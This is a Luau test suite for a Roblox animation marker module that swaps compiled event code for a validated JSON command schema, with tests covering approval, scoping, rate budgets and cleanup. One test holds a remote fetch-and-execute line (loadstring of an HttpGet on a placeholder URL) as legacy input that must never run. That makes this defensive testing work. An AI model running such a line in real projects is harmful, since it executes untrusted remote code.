-- Trusted module + inert scene/JSON mocks. Event text is never compiled.
local passed = 0
local decodedFixtures = {}
local NULL = {}
local function array(values) return setmetatable(values or {}, {jsonArray = true}) end
local function copy(value)
	if value == NULL then return nil end
	if type(value) ~= "table" then return value end
	local result = {}
	for key, child in pairs(value) do result[key] = copy(child) end
	return result
end
local function quote(value)
	return '"' .. value:gsub('[%z\1-\31\\"]', function(character)
		if character == '"' then return '\\"' end
		if character == '\\' then return '\\\\' end
		return string.format("\\u%04x", string.byte(character))
	end) .. '"'
end
local function encode(value)
	if value == NULL then return "null" end
	if type(value) == "string" then return quote(value) end
	if type(value) ~= "table" then return tostring(value) end
	local elements = {}
	if getmetatable(value) and getmetatable(value).jsonArray then
		for _, child in ipairs(value) do table.insert(elements, encode(child)) end
		return "[" .. table.concat(elements, ",") .. "]"
	end
	local keys = {}
	for key in pairs(value) do table.insert(keys, key) end
	table.sort(keys)
	for _, key in ipairs(keys) do table.insert(elements, quote(key) .. ":" .. encode(value[key])) end
	return "{" .. table.concat(elements, ",") .. "}"
end
local function json(value)
	local text = encode(value)
	decodedFixtures[text] = copy(value)
	return text
end
local function registerJSON(text, decoded)
	decodedFixtures[text] = decoded
	return text
end
local function action(op, target, count)
	return {op = op, target = array(target), count = count}
end
local function program(actions) return json({version = 1, actions = array(actions)}) end
local function check(condition, message)
	if not condition then error(message or "Check failed", 2) end
end
local function test(name, callback)
	callback()
	passed += 1
	print("PASS " .. name)
end
local function signal()
	local callbacks = {}
	return {
		Connect = function(self, callback)
			local connection = {active = true}
			callbacks[connection] = callback
			function connection:Disconnect() self.active = false callbacks[self] = nil end
			return connection
		end,
		Fire = function(self)
			local snapshot = {}
			for connection, callback in pairs(callbacks) do snapshot[connection] = callback end
			for connection, callback in pairs(snapshot) do if connection.active then callback() end end
		end,
	}
end
local function instance(className, name, parent)
	local object = {instanceTag = true, ClassName = className, Name = name, Parent = parent,
		children = {}, IsPlaying = false, Looped = false, playCalls = 0, stopCalls = 0,
		emitCalls = 0, emitted = 0, clearCalls = 0, Ended = signal(), Stopped = signal()}
	if parent then table.insert(parent.children, object) end
	function object:IsA(class)
		return self.ClassName == class or (class == "BasePart" and self.ClassName == "Part")
	end
	function object:IsDescendantOf(ancestor)
		local current = self.Parent
		while current do if current == ancestor then return true end current = current.Parent end
		return false
	end
	function object:GetChildren()
		self.childReads = (self.childReads or 0) + 1
		local result = {}
		for _, child in ipairs(self.children) do table.insert(result, child) end
		return result
	end
	function object:Play()
		if self.failPlay then error("Injected engine play failure") end
		self.playCalls += 1 self.IsPlaying = true
	end
	function object:Stop()
		self.stopCalls += 1 self.IsPlaying = false self.Stopped:Fire()
	end
	function object:Emit(count)
		if self.failEmit then error("Injected engine emit failure") end
		self.emitCalls += 1 self.emitted += count
	end
	function object:Clear() self.clearCalls += 1 end
	return object
end
local function reparent(object, parent)
	if object.Parent then
		for index, child in ipairs(object.Parent.children) do
			if child == object then table.remove(object.Parent.children, index) break end
		end
	end
	object.Parent = parent
	if parent then table.insert(parent.children, object) end
end
local function newSession()
	local state = {warnings = {}, evaluatorCalls = 0, time = 0, decoderCalls = 0}
	local _G = {MoonGlobal = {req = function() end}}
	local super = {}
	function super:new() return {} end
	function super:SetEnabled(value) self.Enabled = value end
	function super:Destroy() self.destroyed = true end
	function super:RemoveTrackItem(marker)
		for index, item in ipairs(self.TrackItems.Objects) do
			if item == marker then table.remove(self.TrackItems.Objects, index) break end
		end
		marker.ParentTrack = nil
	end
	local script = {Name = "MarkerTrack"}
	local os = {clock = function() return state.time end}
	local function typeof(value)
		return type(value) == "table" and value.instanceTag and "Instance" or type(value)
	end
	local workspace = instance("Workspace", "Workspace")
	local http = {JSONDecode = function(self, text)
		state.decoderCalls += 1
		local fixture = decodedFixtures[text]
		if fixture == nil then error("Invalid JSON fixture (no parser/evaluator is used in tests)") end
		return copy(fixture)
	end}
	local game = {GetService = function(self, name)
		if name == "HttpService" then return http end
		if name == "Workspace" then return workspace end
		error("Unexpected service access: " .. name)
	end}
	local function loadstring(_source) state.evaluatorCalls += 1 error("Forbidden evaluator") end
	local function setfenv(...) state.evaluatorCalls += 1 error("Forbidden environment mutation") end
	local function warn(message) table.insert(state.warnings, message) end
	local module = (function()
-- MODULE_SOURCE_INSERTION_POINT
	end)()
	state.workspace = workspace
	return module, state
end
local function scene(state, name)
	local root = instance("Model", name or "Rig", state.workspace)
	local head = instance("Part", "Head", root)
	local sound = instance("Sound", "Footstep", head)
	local muzzle = instance("Attachment", "Muzzle", root)
	local emitter = instance("ParticleEmitter", "Flash", muzzle)
	return root, sound, emitter
end
local function marker(frame, width, beginCode, endCode)
	return {frm_pos = frame, width = width, name = "Footstep", codeBegin = beginCode or "",
		codeEnd = endCode or "", KFMarkers = {{"Footstep", "left"}}}
end
local function newTrack(module, root, markers, handler, length)
	local path = {Item = root}
	function path:GetItem() return self.Item end
	local track = setmetatable({TrackItemPositions = {}, LastUpdate = -1, Enabled = true,
		ItemObject = {Path = path}, TrackItems = {Objects = markers},
		LayerSystem = {PlaybackHandler = handler or {Playing = true, ActiveTracks = {}},
			length = length or 20, SliderFrame = 0}}, {__index = module})
	function track.TrackItems:Contains(marker)
		for _, item in ipairs(self.Objects) do if item == marker then return true end end
		return false
	end
	for _, item in ipairs(markers) do
		item.ParentTrack = track
		for frame = item.frm_pos, item.frm_pos + item.width do
			check(track.TrackItemPositions[frame] == nil, "Overlapping fixture markers")
			track.TrackItemPositions[frame] = item
		end
	end
	return track
end
local function approved(module, root, beginText, endText, handler)
	local item = marker(0, 1, beginText, endText)
	local track = newTrack(module, root, {item}, handler)
	local ok, err = track:ApproveMarkerCommands(item)
	check(ok, err)
	return track, item
end
local function noEval(state) check(state.evaluatorCalls == 0, "Event text reached an evaluator") end
local function play() return action("sound.play", {"Head", "Footstep"}) end
local function stop() return action("sound.stop", {"Head", "Footstep"}) end
local function emit(count) return action("particle.emit", {"Muzzle", "Flash"}, count) end
local function clear() return action("particle.clear", {"Muzzle", "Flash"}) end

test("schema accepts empty text and all four fixed operations", function()
	local module = newSession()
	check(module.ValidateCommands(" \t\r\n"))
	check(module.ValidateCommands(program({play(), stop(), emit(12), clear()})))
	check(module.ValidateCommands(program({action("sound.play", {})})))
	check(module.ValidateCommands(program({})))
end)

test("strict JSON shapes, duplicates, unknown fields, and versions are rejected", function()
	local module = newSession()
	local invalid = {
		json({version = 2, actions = array({})}), json({version = 1, actions = {}}),
		json({version = 1, actions = array({action("sound.play", {})}), extra = true}),
		json({version = 1, actions = array({{op = "sound.play", target = {}}})}),
		json({version = 1, actions = array({{op = "sound.play", target = array({}), count = 1}})}),
		program({action("game.GetService", {})}), program({NULL}),
		program({{op = "sound.play", target = array({NULL})}}),
		registerJSON('{"version":1,"version":1,"actions":[]}', {version = 1, actions = {}}),
		registerJSON('{"vers\\u0069on":1,"actions":[]}', {version = 1, actions = {}}),
		'{"version":1,"actions":[}', 'require(123)', 'return {}',
	}
	for _, text in ipairs(invalid) do check(not module.ValidateCommands(text), "Accepted invalid program: " .. text) end
end)

test("byte, action, segment, and particle limits reject complete programs", function()
	local module = newSession()
	check(not module.ValidateCommands(string.rep(" ", 4097)))
	local many = {} for _ = 1, 17 do table.insert(many, clear()) end
	check(not module.ValidateCommands(program(many)))
	local deep = {} for _ = 1, 9 do table.insert(deep, "child") end
	check(not module.ValidateCommands(program({action("sound.play", deep)})))
	for _, segment in ipairs({"..", ".", "Parent", "Head/Sound", "Head\\Sound", "", "\0", string.rep("x", 129)}) do
		check(not module.ValidateCommands(program({action("sound.play", {segment})})), "Accepted forbidden path")
	end
	for _, count in ipairs({0, -1, 101, 1.5, math.huge, -math.huge, 0/0}) do
		check(not module.ValidateCommands(program({emit(count)})), "Accepted invalid particle count")
	end
	check(module.ValidateCommands(program({emit(100), emit(100), emit(56)})))
	check(not module.ValidateCommands(program({emit(100), emit(100), emit(57)})))
end)

test("legacy source and imported approval fields cannot execute or grant access", function()
	local module, state = newSession()
	local root, sound = scene(state)
	local item = marker(0, 0, 'loadstring(game:HttpGet("https://invalid"))()', "")
	item.approved = true item.SafeApproved = true
	local track = newTrack(module, root, {item})
	track:_Update(0)
	check(not track:IsMarkerApproved(item) and sound.playCalls == 0)
	check(#state.warnings == 1)
	item.codeBegin = program({play()})
	check(not track:_ExecuteCommands(item, "begin"))
	check(sound.playCalls == 0)
	noEval(state)
end)

test("approval checks both programs and every target before granting", function()
	local module, state = newSession()
	local root, sound = scene(state)
	local item = marker(0, 1, program({play()}), 'print("legacy")')
	local track = newTrack(module, root, {item})
	check(not track:ApproveMarkerCommands(item))
	check(not track:IsMarkerApproved(item))
	item.codeEnd = program({action("particle.emit", {"Missing"}, 1)})
	check(not track:ApproveMarkerCommands(item))
	check(sound.playCalls == 0)
	item.codeEnd = ""
	check(track:ApproveMarkerCommands(item))
	check(track:IsMarkerApproved(item))
end)

test("scope rejects services, folders, outside roots, wrong classes, and ambiguous children", function()
	local module, state = newSession()
	local root, sound = scene(state)
	for _, badRoot in ipairs({state.workspace, instance("Folder", "Folder", state.workspace),
		instance("Model", "Outside", instance("ReplicatedStorage", "Storage"))}) do
		local item = marker(0, 1, program({}), "")
		check(not newTrack(module, badRoot, {item}):ApproveMarkerCommands(item))
	end
	local item = marker(0, 1, program({action("sound.play", {"Muzzle"})}), "")
	local track = newTrack(module, root, {item})
	check(not track:ApproveMarkerCommands(item))
	item.codeBegin = program({play()})
	instance("Sound", "Footstep", sound.Parent)
	check(not track:ApproveMarkerCommands(item))
	check(sound.playCalls == 0)
end)

test("empty target arrays bind only to an allowed root instance", function()
	local module, state = newSession()
	local sound = instance("Sound", "RootSound", state.workspace)
	local track, item = approved(module, sound, program({action("sound.play", {})}), "")
	check(track:_ExecuteCommands(item, "begin") and sound.playCalls == 1)
	local emitter = instance("ParticleEmitter", "RootEmitter", state.workspace)
	local other, otherItem = approved(module, emitter, program({action("particle.emit", {}, 4)}), "")
	check(other:_ExecuteCommands(otherItem, "begin") and emitter.emitted == 4)
end)

test("approved begin/end programs dispatch fixed effects and preserve named markers", function()
	local module, state = newSession()
	local root, sound, emitter = scene(state)
	local beginText, endText = program({play(), emit(12)}), program({stop(), clear()})
	local track, item = approved(module, root, beginText, endText)
	track:_Update(0)
	check(sound.playCalls == 1 and emitter.emitted == 12)
	track:_Update(1)
	check(sound.stopCalls == 1 and emitter.clearCalls == 1)
	check(item.codeBegin == beginText and item.codeEnd == endText and item.name == "Footstep")
	check(item.KFMarkers[1][1] == "Footstep" and item.KFMarkers[1][2] == "left")
	noEval(state)
end)

test("natural sound completion does not block remaining end actions", function()
	local module, state = newSession()
	local root, sound, emitter = scene(state)
	local track, item = approved(module, root, program({play(), emit(2)}), program({stop(), clear()}))
	check(track:_ExecuteCommands(item, "begin"))
	sound.IsPlaying = false sound.Ended:Fire()
	check(track:_ExecuteCommands(item, "end"))
	check(sound.stopCalls == 0 and emitter.clearCalls == 1)
end)

test("sound preflight simulates stop then play before effects", function()
	local module, state = newSession()
	local root, sound = scene(state)
	local track, item = approved(module, root, program({play()}), program({stop(), play()}))
	check(track:_ExecuteCommands(item, "begin"))
	check(track:_ExecuteCommands(item, "end"))
	check(sound.playCalls == 2 and sound.stopCalls == 1 and sound.IsPlaying)
end)

test("externally playing sounds cannot be stopped or taken over and reject the whole program", function()
	for _, operation in ipairs({play, stop}) do
		local module, state = newSession()
		local root, sound, emitter = scene(state)
		sound.IsPlaying = true
		local track, item = approved(module, root, program({emit(1), operation()}), "")
		check(not track:_ExecuteCommands(item, "begin"))
		check(sound.playCalls == 0 and sound.stopCalls == 0 and emitter.emitted == 0)
	end
end)

test("exact source edits invalidate the entire grant and cannot be restored by changing back", function()
	local module, state = newSession()
	local root, sound = scene(state)
	local text = program({play()})
	local track, item = approved(module, root, text, "")
	item.codeEnd = " "
	check(not track:IsMarkerApproved(item))
	item.codeEnd = ""
	check(not track:IsMarkerApproved(item))
	check(not track:_ExecuteCommands(item, "begin") and sound.playCalls == 0)
	check(track:ApproveMarkerCommands(item))
	item.codeBegin = text .. " "
	check(not track:IsMarkerApproved(item))
end)

test("root rebinding and ancestor reparenting invalidate approval", function()
	local module, state = newSession()
	local root, sound = scene(state)
	local track, item = approved(module, root, program({play()}), "")
	track.ItemObject.Path.Item = scene(state, "Replacement")
	check(not track:IsMarkerApproved(item))
	track.ItemObject.Path.Item = root
	check(track:ApproveMarkerCommands(item))
	reparent(root, instance("Folder", "Moved", state.workspace))
	check(not track:IsMarkerApproved(item) and sound.playCalls == 0)
end)

test("cleared source at actual empty playback boundaries cleans active effects even without attempt tokens", function()
	for _, field in ipairs({"codeBegin", "codeEnd"}) do
		local module, state = newSession()
		local root, sound, emitter = scene(state)
		local track, item = approved(module, root, program({play(), emit(2)}), program({stop(), clear()}))
		track:_Update(0)
		check(sound.IsPlaying and emitter.emitted == 2)
		-- Spend the remaining attempt tokens without touching the approved effects.
		local denied = marker(3, 0, program({play()}), "")
		local other = newTrack(module, root, {denied}, track.LayerSystem.PlaybackHandler)
		for _ = 1, 15 do check(not other:_ExecuteCommands(denied, "begin")) end
		item[field] = ""
		if field == "codeBegin" then
			track.LastUpdate = track.LayerSystem.length
			track:_Update(0) -- Wrap reaches the now-empty begin boundary.
		else
			track:_Update(1) -- Forward playback reaches the now-empty end boundary.
		end
		check(sound.stopCalls == 1 and emitter.clearCalls == 1,
			"The actual playback boundary did not clean effects immediately")
		check(not track:IsMarkerApproved(item))
	end
end)

test("target replacement, reparenting, and new ambiguity invalidate actual identities", function()
	for _, mode in ipairs({"replace", "move", "duplicate"}) do
		local module, state = newSession()
		local root, sound = scene(state)
		local track, item = approved(module, root, program({play()}), "")
		local parent = sound.Parent
		if mode == "replace" then reparent(sound, nil) instance("Sound", "Footstep", parent)
		elseif mode == "move" then reparent(sound, root)
		else instance("Sound", "Footstep", parent) end
		check(not track:IsMarkerApproved(item))
		check(not track:_ExecuteCommands(item, "begin") and sound.playCalls == 0)
	end
end)

test("a changed end target prevents all begin effects", function()
	local module, state = newSession()
	local root, sound, emitter = scene(state)
	local track, item = approved(module, root, program({play()}), program({clear()}))
	reparent(emitter, nil)
	check(not track:_ExecuteCommands(item, "begin") and sound.playCalls == 0)
end)

test("sound capacity is preflighted for the complete program", function()
	local module, state = newSession()
	local root = instance("Model", "Rig", state.workspace)
	local actions, sounds = {}, {}
	for index = 1, 9 do
		sounds[index] = instance("Sound", "Sound" .. index, root)
		actions[index] = action("sound.play", {"Sound" .. index})
	end
	local track, item = approved(module, root, program(actions), "")
	check(not track:_ExecuteCommands(item, "begin"))
	for _, sound in ipairs(sounds) do check(sound.playCalls == 0) end
end)

test("emitter capacity is shared across tracks and preflighted", function()
	local module, state = newSession()
	local handler = {Playing = true, ActiveTracks = {}}
	local root = instance("Model", "Rig", state.workspace)
	local actions = {}
	for index = 1, 16 do
		instance("ParticleEmitter", "Emitter" .. index, root)
		actions[index] = action("particle.emit", {"Emitter" .. index}, 1)
	end
	local first, firstItem = approved(module, root, program(actions), "", handler)
	check(first:_ExecuteCommands(firstItem, "begin"))
	local extra = instance("ParticleEmitter", "Extra", root)
	local second, secondItem = approved(module, root, program({action("particle.emit", {"Extra"}, 1)}), "", handler)
	check(not second:_ExecuteCommands(secondItem, "begin") and extra.emitted == 0)
end)

test("action budgets aggregate across tracks and Stop cannot refill them", function()
	local module, state = newSession()
	local handler = {Playing = true, ActiveTracks = {}}
	local firstRoot, _, firstEmitter = scene(state, "A")
	local secondRoot, _, secondEmitter = scene(state, "B")
	local many = {} for _ = 1, 16 do table.insert(many, clear()) end
	local first, firstItem = approved(module, firstRoot, program(many), "", handler)
	local second, secondItem = approved(module, secondRoot, program(many), "", handler)
	check(first:_ExecuteCommands(firstItem, "begin"))
	check(second:_ExecuteCommands(secondItem, "begin"))
	check(firstEmitter.clearCalls == 16 and secondEmitter.clearCalls == 16)
	module.StopSafeEffects(handler)
	local before = firstEmitter.clearCalls
	check(not first:_ExecuteCommands(firstItem, "begin") and firstEmitter.clearCalls == before)
	state.time += 1
	check(first:_ExecuteCommands(firstItem, "begin"))
end)

test("unapproved attempts consume one shared bounded attempt bucket", function()
	local module, state = newSession()
	local root, sound = scene(state)
	local item = marker(0, 1, program({play()}), "")
	local track = newTrack(module, root, {item})
	for _ = 1, 16 do check(not track:_ExecuteCommands(item, "begin")) end
	check(track:ApproveMarkerCommands(item))
	module.StopSafeEffects(track.LayerSystem.PlaybackHandler)
	check(not track:_ExecuteCommands(item, "begin") and sound.playCalls == 0)
	state.time += 1
	check(track:_ExecuteCommands(item, "begin") and sound.playCalls == 1)
	check(#state.warnings <= 2)
end)

test("approved blank boundaries obey the attempt budget before resolving targets", function()
	local module, state = newSession()
	local root, sound = scene(state)
	local track, item = approved(module, root, program({play()}), " \t\n")
	check(track:_ExecuteCommands(item, "begin"))
	for _ = 1, 15 do check(track:_ExecuteCommands(item, "end")) end
	local reads = root.childReads
	for _ = 1, 20 do check(not track:_ExecuteCommands(item, "end")) end
	check(root.childReads == reads, "Blank boundary resolved targets after its attempt budget was spent")
	module.StopSafeEffects(track.LayerSystem.PlaybackHandler)
	check(sound.stopCalls == 1 and not track:_ExecuteCommands(item, "end"))
	check(root.childReads == reads, "Stop refilled the blank boundary attempt budget")
	state.time += 1
	check(track:_ExecuteCommands(item, "end") and root.childReads > reads)
end)

test("unapproved empty boundaries stay cheap and consume no command budget", function()
	local module, state = newSession()
	local root, sound = scene(state)
	local blank = marker(0, 0, "", " \t\n")
	local track = newTrack(module, root, {blank})
	for _ = 1, 100 do track:_RunCodeAt(0) end
	check(root.childReads == nil and state.decoderCalls == 0 and #state.warnings == 0)
	local approvedTrack, item = approved(module, root, program({play()}), "", track.LayerSystem.PlaybackHandler)
	check(approvedTrack:_ExecuteCommands(item, "begin") and sound.playCalls == 1)
end)

test("particle rate budgets aggregate and survive Stop", function()
	local module, state = newSession()
	local handler = {Playing = true, ActiveTracks = {}}
	local rootA = scene(state, "A")
	local rootB, _, emitterB = scene(state, "B")
	local first, a = approved(module, rootA, program({emit(100), emit(28)}), "", handler)
	local second, b = approved(module, rootB, program({emit(100), emit(28)}), "", handler)
	check(first:_ExecuteCommands(a, "begin")) check(second:_ExecuteCommands(b, "begin"))
	module.StopSafeEffects(handler)
	check(not second:_ExecuteCommands(b, "begin") and emitterB.emitted == 128)
	state.time += 1
	check(second:_ExecuteCommands(b, "begin") and emitterB.emitted == 256)
end)

test("per-play emission cap survives time refill and resets only on Stop", function()
	local module, state = newSession()
	local root, _, emitter = scene(state)
	local track, item = approved(module, root, program({emit(100), emit(100), emit(56)}), "")
	for _ = 1, 8 do
		check(track:_ExecuteCommands(item, "begin")) state.time += 1
	end
	check(emitter.emitted == 2048)
	check(not track:_ExecuteCommands(item, "begin") and emitter.emitted == 2048)
	module.StopSafeEffects(track.LayerSystem.PlaybackHandler)
	check(track:IsMarkerApproved(item))
	check(track:_ExecuteCommands(item, "begin") and emitter.emitted == 2304)
end)

test("Stop cleans owned looped sounds and emitters while retaining approval", function()
	local module, state = newSession()
	local root, sound, emitter = scene(state)
	local unrelated = instance("Sound", "External", root) unrelated.IsPlaying = true
	sound.Looped = true
	local track, item = approved(module, root, program({play(), emit(2)}), "")
	check(track:_ExecuteCommands(item, "begin"))
	module.StopSafeEffects(track.LayerSystem.PlaybackHandler)
	check(sound.stopCalls == 1 and not sound.IsPlaying and emitter.clearCalls == 1)
	check(unrelated.stopCalls == 0 and unrelated.IsPlaying and track:IsMarkerApproved(item))
end)

test("disable and destroy clean only their owner and revoke its grants", function()
	for _, lifecycle in ipairs({"disable", "destroy", "remove"}) do
		local module, state = newSession()
		local handler = {Playing = true, ActiveTracks = {}}
		local rootA, soundA, emitterA = scene(state, "A")
		local rootB, soundB, emitterB = scene(state, "B")
		local first, a = approved(module, rootA, program({play(), emit(1)}), "", handler)
		local second, b = approved(module, rootB, program({play(), emit(1)}), "", handler)
		check(first:_ExecuteCommands(a, "begin")) check(second:_ExecuteCommands(b, "begin"))
		if lifecycle == "disable" then first:SetEnabled(false, true)
		elseif lifecycle == "destroy" then first:Destroy()
		else first:RemoveMarker(a) end
		check(soundA.stopCalls == 1 and emitterA.clearCalls == 1 and not first:IsMarkerApproved(a))
		check(soundB.stopCalls == 0 and emitterB.clearCalls == 0 and second:IsMarkerApproved(b))
	end
end)

test("explicit revoke cleans only effects assigned to that marker", function()
	local module, state = newSession()
	local root, sound, emitter = scene(state)
	local track, item = approved(module, root, program({play(), emit(1)}), "")
	check(track:_ExecuteCommands(item, "begin"))
	track:RevokeMarkerCommands(item)
	check(not track:IsMarkerApproved(item) and sound.stopCalls == 1 and emitter.clearCalls == 1)
end)

test("engine failures revoke approval and clean earlier owned effects", function()
	local module, state = newSession()
	local root, sound, emitter = scene(state)
	emitter.failEmit = true
	local track, item = approved(module, root, program({play(), emit(1)}), "")
	check(not track:_ExecuteCommands(item, "begin"))
	check(sound.playCalls == 1 and sound.stopCalls == 1 and not sound.IsPlaying)
	check(not track:IsMarkerApproved(item))
	noEval(state)
end)

test("large child sets and deep ancestry fail before approval", function()
	local module, state = newSession()
	local root = instance("Model", "Wide", state.workspace)
	for index = 1, 257 do instance("Sound", "Sound" .. index, root) end
	local item = marker(0, 1, program({action("sound.play", {"Sound1"})}), "")
	check(not newTrack(module, root, {item}):ApproveMarkerCommands(item))
	local parent = state.workspace
	for index = 1, 65 do parent = instance("Model", "Depth" .. index, parent) end
	local empty = marker(0, 1, "", "")
	check(not newTrack(module, parent, {empty}):ApproveMarkerCommands(empty))
end)

test("approval storage is bounded and explicit removal frees a grant", function()
	local module, state = newSession()
	local root = scene(state)
	local markers = {}
	for index = 1, 129 do markers[index] = marker(index * 2, 0, "", "") end
	local track = newTrack(module, root, markers, nil, 300)
	for index = 1, 128 do check(track:ApproveMarkerCommands(markers[index])) end
	check(not track:ApproveMarkerCommands(markers[129]))
	track:RevokeMarkerCommands(markers[1])
	check(track:ApproveMarkerCommands(markers[129]))
end)

test("paused playback leaves boundaries untouched and wrap preserves begin/end order", function()
	local module, state = newSession()
	local root = scene(state)
	local a = marker(2, 2, "A begin", "A end")
	local b = marker(6, 0, "B begin", "B end")
	local track = newTrack(module, root, {a, b}, nil, 10)
	local reached = {}
	track._ExecuteCommands = function(self, item, phase) table.insert(reached, item == a and "A " .. phase or "B " .. phase) end
	track.LayerSystem.PlaybackHandler.Playing = false
	track:_Update(4)
	check(track.LastUpdate == -1 and #reached == 0)
	track.LayerSystem.PlaybackHandler.Playing = true
	track:_Update(4) track:_Update(7) track:_Update(3)
	check(table.concat(reached, ",") == "A begin,A end,B begin,B end,A begin")
	check(track.LastUpdate == 3)
	noEval(state)
end)

test("excessive frame skips and wraparound skip event preview with bounded work", function()
	local module, state = newSession()
	local root, sound = scene(state)
	local track, item = approved(module, root, program({play()}), "")
	track.LayerSystem.length = 1000000
	check(track:_ExecuteCommands(item, "begin"))
	local visits = 0
	track._RunCodeAt = function() visits += 1 end
	track:_Update(500000)
	check(visits == 0 and track.LastUpdate == 500000 and sound.stopCalls == 1)
	check(#state.warnings == 1 and state.warnings[1]:find("preview skipped", 1, true))
	track:_Update(10)
	check(visits == 0 and track.LastUpdate == 10)
	track:_Update(11)
	check(visits == 1, "Normal playback did not recover after a large seek")
end)

test("invalid numeric timeline data cannot enter traversal loops", function()
	local module, state = newSession()
	local root = scene(state)
	local track = newTrack(module, root, {})
	local visits = 0
	track._RunCodeAt = function() visits += 1 end
	for _, invalid in ipairs({math.huge, -math.huge, 0/0, -2, 1.5, 1000001, "100"}) do
		track.LastUpdate = 0 track.LayerSystem.length = 20
		track:_Update(invalid)
		check(visits == 0 and track.LastUpdate == -1)
		track.LastUpdate = 0 track.LayerSystem.length = invalid
		track:_Update(1)
		check(visits == 0 and track.LastUpdate == 1)
		track.LastUpdate = invalid track.LayerSystem.length = 20
		track:_Update(1)
		check(visits == 0 and track.LastUpdate == 1)
	end
end)

print(string.format("MarkerTrack: %d behavior tests passed", passed))
